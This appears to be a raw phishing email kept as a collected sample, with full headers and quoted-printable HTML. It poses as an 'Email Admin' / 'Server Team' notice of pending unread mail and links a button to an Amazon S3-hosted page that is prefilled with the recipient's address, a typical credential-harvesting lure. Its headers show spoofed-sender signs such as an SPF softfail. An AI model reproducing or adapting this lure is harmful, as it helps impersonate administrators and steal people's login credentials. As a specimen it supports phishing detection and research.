@@ -1,0 +1,151 @@
+From jose@monkey.org Tue Aug  8 23:06:57 2023 +0000
+Return-Path: exportacion@atlants.net
+Delivered-To: jose@monkey.org
+X-FDA: 81102474474.03.D49DB01
+Received: from server.pipeandpiper.co.uk (server.pipeandpiper.co.uk [109.228.53.144])
+	by imf05.b.hostedemail.com (Postfix) with ESMTP id 211221C0005
+	for <jose@monkey.org>; Tue,  8 Aug 2023 23:06:54 +0000 (UTC)
+Authentication-Results: imf05.b.hostedemail.com;
+	dkim=none;
+	spf=softfail (imf05.b.hostedemail.com: 109.228.53.144 is neither permitted nor denied by domain of exportacion@atlants.net) smtp.mailfrom=exportacion@atlants.net;
+	dmarc=none
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=hostedemail.com;
+	s=arc-20220608; t=1691536015;
+	h=from:from:sender:reply-to:subject:subject:date:date:
+	 message-id:message-id:to:to:cc:mime-version:mime-version:
+	 content-type:content-type:
+	 content-transfer-encoding:content-transfer-encoding:in-reply-to:
+	 references; bh=1XWI2a903iCNw9YvgiOAY4qlHjy8FAlGzpVipPWP2uA=;
+	b=LsbK2VGfei4zlMIs32JvYVa2KSsU/PkkU12tOl0TIM5UqY/3NnqvcjJzQPwm91j5lbwBtW
+	hkDnzpyOS8DQ+enrGzi3Fej5BsLvQGMrUC5n+1NUSq91JWa7lyyfxR+2szHoeUb+ooUjWr
+	Xtqej2L9FzRqfUBYdJFJU51PjaP0Vxk=
+ARC-Seal: i=1; s=arc-20220608; d=hostedemail.com; t=1691536015; a=rsa-sha256;
+	cv=none;
+	b=vh47ruRu6lYTkpwh2v+9tIXpxIW8GyAtZj4xrv2qBUDCfRVVaYlYDmCbJbsL7gUQTnCnRD
+	zyqIB2JI9cLPJicVP/fb35ejPLtudTLBnHllYJ4tIpwliQ3kiYeWv1kEIOsqcSGbCX9Eul
+	d/WcUNWZqSOEwB7hhkHIXhcJWuU51Mo=
+ARC-Authentication-Results: i=1;
+	imf05.b.hostedemail.com;
+	dkim=none;
+	spf=softfail (imf05.b.hostedemail.com: 109.228.53.144 is neither permitted nor denied by domain of exportacion@atlants.net) smtp.mailfrom=exportacion@atlants.net;
+	dmarc=none
+Received: from atlants.net (unknown [212.162.149.36])
+	by server.pipeandpiper.co.uk (Postfix) with ESMTPSA id 466FC9EE89
+	for <jose@monkey.org>; Wed,  9 Aug 2023 00:06:53 +0100 (BST)
+From: Email Admin <exportacion@atlants.net>
+To: jose@monkey.org
+Subject: Unread Mails Pending (jose@monkey.org)
+Date: 8 Aug 2023 16:06:30 -0700
+Message-ID: <20230808160630.6162D45B0AFE6FE7@atlants.net>
+MIME-Version: 1.0
+Content-Type: text/html
+Content-Transfer-Encoding: quoted-printable
+X-Rspamd-Server: rspam10
+X-Rspamd-Queue-Id: 211221C0005
+X-Stat-Signature: zmdyiikq8o5zihgcp95q9geps91s4ogy
+X-Spam-Status: No, score=4.70
+X-Rspam-User: 
+X-HE-Tag: 1691536014-965155
+X-HE-Meta: U2FsdGVkX1+VFPadmZRS0I0OX1KPSFN944ByYwdzQi8yodpIeS7+5HXo3SVYlfK7KfPkYgyb4Wvk4T1Mk8BX//Hvci9sXwuQvI+ZRRi4ZeuEh6fspKZfPmNNrFxTQ0TuAz3myWIngtJ6YvjIy7dfvuK0io0Cb/S3vmvlc0W98xjtyXCZ/FRW9beA+IeDWLqHFBMMXc5pRuCrdru8qhclFPpI+Fw0KaQTTTq/ojveMWbIT+lwSA2FkCZnmeIPndmq3T4cLnRLrWAG9eIBewfmqIx3c10cPwF1Qnrsl7tuR3XP0XlIEK7l1wS7BLs+qRw3ffWgTaFbt1D6aEeVxie6qLU5IRYKxvwp7aNr2w2d/vpATJof8CSEXjzyihdG1I72Evn3N3kyE/yNN0m5FicpEiyX+NZ9Dk5nXlfnKUJhaleLjsaqiuDWov6JoCDjTBuA+C0WttryPo3UiQ7BaJq1ZgNxR//BvhKPbhTJNKUUpTNgWEEx7K4YtFDqHARnQhZrBwWAxd55be3PHN4Hxf1ZIsIzBYthUTwPdVzqtLJcBUOAk0KqX/TfKg==
+Status: O
+X-Status: 
+X-Keywords:                  
+X-UID: 234
+
+<HTML><HEAD>
+<META name=3DGENERATOR content=3D"MSHTML 11.00.9600.17037"></HEAD>
+<BODY>
+<P style=3D"BOX-SIZING: border-box; FONT-SIZE: small; FONT-FAMILY: Arial, H=
+elvetica, sans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFOR=
+M: none; FONT-WEIGHT: 400; COLOR: rgb(34,34,34); FONT-STYLE: normal; TEXT-A=
+LIGN: left; ORPHANS: 2; WIDOWS: 2; MARGIN-TOP: 0px; LETTER-SPACING: normal;=
+ BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px; font-variant-ligatur=
+es: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text=
+-decoration-thickness: initial;=20
+text-decoration-style: initial; text-decoration-color: initial"><SPAN style=
+=3D'BOX-SIZING: border-box; FONT-FAMILY: "comic sans ms", sans-serif'><SPAN=
+ style=3D"BOX-SIZING: border-box; COLOR: rgb(0,0,0)">Dear&nbsp;<SPAN style=
+=3D'BOX-SIZING: border-box; FONT-FAMILY: "microsoft yahei"'>jose<BR style=
+=3D"BOX-SIZING: border-box"></SPAN></SPAN></SPAN></P>
+<DIV style=3D"BOX-SIZING: border-box; FONT-SIZE: 14px; FONT-FAMILY: Arial, =
+Helvetica, sans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFO=
+RM: none; FONT-WEIGHT: 400; COLOR: rgb(34,34,34); FONT-STYLE: normal; TEXT-=
+ALIGN: left; ORPHANS: 2; WIDOWS: 2; LETTER-SPACING: normal; LINE-HEIGHT: 20=
+px; BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px; font-variant-liga=
+tures: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; t=
+ext-decoration-thickness: initial;=20
+text-decoration-style: initial; text-decoration-color: initial"><BR style=
+=3D"BOX-SIZING: border-box"><BR style=3D"BOX-SIZING: border-box">Kindly Cli=
+ck below to check your unread messages<BR style=3D"BOX-SIZING: border-box">=
+</DIV>
+<DIV style=3D"BOX-SIZING: border-box; FONT-SIZE: 14px; FONT-FAMILY: Arial, =
+Helvetica, sans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFO=
+RM: none; FONT-WEIGHT: 400; COLOR: rgb(34,34,34); FONT-STYLE: normal; TEXT-=
+ALIGN: left; ORPHANS: 2; WIDOWS: 2; LETTER-SPACING: normal; LINE-HEIGHT: 20=
+px; BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px; font-variant-liga=
+tures: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; t=
+ext-decoration-thickness: initial;=20
+text-decoration-style: initial; text-decoration-color: initial"><BR style=
+=3D"BOX-SIZING: border-box"><BR style=3D"BOX-SIZING: border-box"><SPAN styl=
+e=3D"BOX-SIZING: border-box; FONT-SIZE: 16px; FONT-FAMILY: Calibri, Helveti=
+ca, sans-serif, serif, EmojiFont; COLOR: rgb(0,0,0)">&nbsp;</SPAN><SPAN>&nb=
+sp;</SPAN>
+<A=20
+id=3D"v1m_-6511284110742587942m_-1663652343613540186m_900451811118158458m_7=
+056807900569508242m_687449927578618357m_-7255114699375228692m_3780158167128=
+336553m_-6811892879677636015m_-5155853837002527910m_-4910000739129831020m_-=
+2186600490178829291m_8815218675822218724m_-8546867635394850543m_-8072520822=
+16831721m_1073137828326879738m_-6057545010128282681m_-4661739869268422379m_=
+-404544247712735530m_-1533274631702376351m_-6084233247681856017m_-205220330=
+5387373919gmail-m_-3997106641480234624m_236388991796
+81&#10;v123476m_-8074218711000683757m_-4483901888279337516m_-35082552699620=
+54872m_-7879740255195928088m_-2767652349493765217m_-3186031892811442365m_48=
+21011314759408656m_2541254788822180041m_3815566133262450891m_-2000575181067=
+050407m_-3049975846285837386m_6522585063452016668m_-8078573266237770221m_17=
+23108943027510822m_-8421538160960907456m_617484351025508151m_-1835418628946=
+527732gmail-m_7970756032094935407m_-4275200203261198569m_-19020478197050412=
+88m_7953567911949991221m_-8288501023602641164gmail
+-m_709417&#10;v15838472121846m_-8707261559415334711m_-7658579790915273805m_=
+-2266309564055614613m_8787081306190339495gmail-m_-5490983525790084814m_-880=
+0759157057102501gmail-m_-2644144793307330709m_-960438529742916139gmail-m_-1=
+909586704279057787m_8663290507522917028m_1330514896034636286m_-878349600981=
+7326850gmail-LPlnk877781" style=3D"BOX-SIZING: border-box; TEXT-DECORATION:=
+ none; COLOR: rgb(25,106,212); PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDI=
+NG-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px;=20
+BACKGROUND-COLOR: transparent" href=3D"https://s3.amazonaws.com/appforest_u=
+f/f1677039495606x672177498312141600/index.html#jose@monkey.org" rel=3Dnoref=
+errer target=3D_blank><FONT style=3D"BACKGROUND-COLOR: #3419e6" color=3D#ff=
+ffff>Unread Messages</FONT></A><BR style=3D"BOX-SIZING: border-box"></DIV>
+<DIV style=3D"BOX-SIZING: border-box; FONT-SIZE: small; FONT-FAMILY: Arial,=
+ Helvetica, sans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSF=
+ORM: none; FONT-WEIGHT: 400; COLOR: rgb(34,34,34); FONT-STYLE: normal; TEXT=
+-ALIGN: left; ORPHANS: 2; WIDOWS: 2; LETTER-SPACING: normal; BACKGROUND-COL=
+OR: rgb(255,255,255); TEXT-INDENT: 0px; font-variant-ligatures: normal; fon=
+t-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-thi=
+ckness: initial; text-decoration-style: initial;=20
+text-decoration-color: initial"><SPAN style=3D"BOX-SIZING: border-box; FONT=
+-SIZE: 14px; FONT-FAMILY: Tahoma, Verdana, Arial, sans-serif; COLOR: rgb(69=
+,69,69); BACKGROUND-COLOR: transparent; font-variant-numeric: normal; font-=
+variant-east-asian: normal; font-variant-alternates: normal"></SPAN><BR sty=
+le=3D"BOX-SIZING: border-box"><BR style=3D"BOX-SIZING: border-box"><BR styl=
+e=3D"BOX-SIZING: border-box">Thanks,<BR style=3D"BOX-SIZING: border-box"></=
+DIV>
+<DIV style=3D"BOX-SIZING: border-box; FONT-SIZE: small; FONT-FAMILY: Arial,=
+ Helvetica, sans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSF=
+ORM: none; FONT-WEIGHT: 400; COLOR: rgb(34,34,34); FONT-STYLE: normal; TEXT=
+-ALIGN: left; ORPHANS: 2; WIDOWS: 2; LETTER-SPACING: normal; BACKGROUND-COL=
+OR: rgb(255,255,255); TEXT-INDENT: 0px; font-variant-ligatures: normal; fon=
+t-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-thi=
+ckness: initial; text-decoration-style: initial;=20
+text-decoration-color: initial"><BR style=3D"BOX-SIZING: border-box"></DIV>=
+
+<DIV style=3D"BOX-SIZING: border-box; FONT-SIZE: small; FONT-FAMILY: Arial,=
+ Helvetica, sans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSF=
+ORM: none; FONT-WEIGHT: 400; COLOR: rgb(34,34,34); FONT-STYLE: normal; TEXT=
+-ALIGN: left; ORPHANS: 2; WIDOWS: 2; LETTER-SPACING: normal; BACKGROUND-COL=
+OR: rgb(255,255,255); TEXT-INDENT: 0px; font-variant-ligatures: normal; fon=
+t-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-thi=
+ckness: initial; text-decoration-style: initial;=20
+text-decoration-color: initial"><FONT style=3D"BOX-SIZING: border-box" face=
+=3DCalibri><B style=3D"BOX-SIZING: border-box; FONT-WEIGHT: bolder">&copy; =
+2023 Server Team</B></FONT></DIV></BODY></HTML>
